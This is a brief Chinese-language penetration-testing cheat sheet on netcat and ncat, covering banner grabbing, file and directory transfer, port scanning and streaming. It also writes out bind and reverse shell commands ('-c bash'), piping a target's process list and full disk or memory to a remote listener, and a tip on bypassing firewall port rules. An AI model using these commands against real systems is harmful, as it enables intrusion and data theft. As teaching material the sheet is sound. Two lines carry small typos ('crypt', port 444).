# netcat 基本使用

标签（空格分隔）： 渗透测试

---
### netcat --nc
* 网络工具中的瑞士军刀
* 侦听模式/传输模式
* telnet/ 获取banner信息
* 传输文本信息
* 传输文件/目录
* 加密传输文件
* 远程控制/木马
* 加密所有流量
* 流媒体服务器
* 远程克隆硬盘


### nc--telnet /banner
* nc -nv 123.125.50.29 110
* nc -nv 1.1.1.1 25
* nc -nv 1.1.1.1 80

### nc 传输文本文件
* nc -lp 4444           服务端
* nc -nv 1.1.1.1 4444   客户端
##### 远程电子取证信息收集
* ps aux |  nc -nv 1.1.1.1 4444 -q 1
* nc -lp 4444 > ps.txt

### nc 传输文件/目录
1. 传输文件
 * A: nc -lp 4444 > 1.mp4
 * B: nc -nv 1.1.1.1 444 < 1.mp4 -q 1
 * 或者
 * A: nc -q 1 -lp 4444 < 1.mp4
 * B: nc -nv 1.1.1.1 4444 > 1.mp4
    (ps:反向传输可以用于绕过 服务器防火墙禁止端口访问)
2. 传输目录
 * A: tar -cvf - music/ | nc -lp 4444 -q 1
 * B: nc -nv 1.1.1.1 4444 | tar -xvf -
3. 加密传文件
 * A: nc -lp 4444 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb > 1.mp4
 * B: crypt --flush -Fbq -a rijndael-256 -m ecb < 1.mp4 | nc -nv 1.1.1.1 4444 -q 1

### nc 流媒体服务
* A: cat 1.mp4 | nc -lp 4444
* B: nc -nv 1.1.1.1 4444 | mplayer -vo x11 -cache 3000

### nc 端口扫描
* nc -nvz 1.1.1.1 1-65535
* nc -nvzu 1.1.1.1 1-1024

### nc 远程克隆硬盘
* nc -lp 4444 | dd of=/dev/sda
* nc dd if=/dev/sda | nc -nv 1.1.1.1 4444 -q 1
* 可以复制目标服务器硬盘 或者 内存

### nc 远程控制
* 正向
 * A: nc -lp 4444 -c bash
 * B: nc 1.1.1.1 4444
* 反向
 * A: nc -lp 4444
 * B: nc 1.1.1.1 4444 -c bash
* ps: windows 用户将bash 改为 cmd


### ncat
* nc缺乏加密和身份验证的能力
* ncat 包含在nmap 工具包中
* ncat -c bash -allow 1.1.1.1 -vnl 333 --ssl
* ncat -nv 1.1.1.1 333 --ssl

 




